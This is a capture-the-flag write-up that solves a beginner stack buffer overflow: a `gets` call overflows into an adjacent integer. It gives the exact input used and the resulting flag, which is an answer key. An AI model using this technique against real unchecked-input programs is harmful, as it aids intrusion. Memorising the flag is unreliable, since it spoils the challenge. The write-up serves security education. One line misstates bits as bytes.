# Bluffer Overflow

We can download the code that is being run on the server, we can also connect to the server with netcat using `nc ctf.tcp1p.com 17027`

Connecting to the server, testing some input, and then looking at the code reveals our objective

```c
if (buff2 == 5134160){
		printf("Congrats, You got the right value!\n");
	 	system("cat flag.txt");
	}
```

In the server code we can find:

```c
printf("Input: ");
	fflush(stdout);
	gets(buff);
```

The `gets` function [reads a line from stdin and stores it into the string pointed to by str](https://www.tutorialspoint.com/c_standard_library/c_function_gets.htm)

With the way that pointers work in C, and the way the program allocates it’s variables

```c
char buff[20];
int buff2;
```

the `gets` function will, when more than `20` characters are entered into `stdin`, continue by overwriting `buff2`

We want `buff2` to be `5134160`. Using modulo and division, we can find that

$$
5134160 = 256^2 * 78 + 256 * 87 + 80
$$

We “convert to base 256” because one character is 8 bits, $2^8 = 256$

The character representations of 78, 87, and 80 are N, W, and P respectively

Trying [20 chars] + NWP yeilds

```bash
Can you get the exact value to print the flag?
Input: 12345678901234567890NWP
Too high!

Output : 12345678901234567890NWP, Value : 5265230
```

We overshot by about $2 * 256^2$, and P - N, in char values is a difference of 2

As it turns out, integers in C are “backwards”. The first 8 bytes contains the lowest value bits 0 - 255 in steps of 1, the second set of 8 bits contain 256 - 65280 in steps of 256 and so on.

Flipping NWP into PWN (PWN is the category!) yeilds

```bash
Can you get the exact value to print the flag?
Input: 12345678901234567890PWN
Congrats, You got the right value!
TCP1P{ez_buff3r_0verflow_l0c4l_v4r1abl3_38763f0c86da16fe14e062cd054d71ca}
Output : 12345678901234567890PWN, Value : 5134160
```

Flag: `TCP1P{ez_buff3r_0verflow_l0c4l_v4r1abl3_38763f0c86da16fe14e062cd054d71ca}`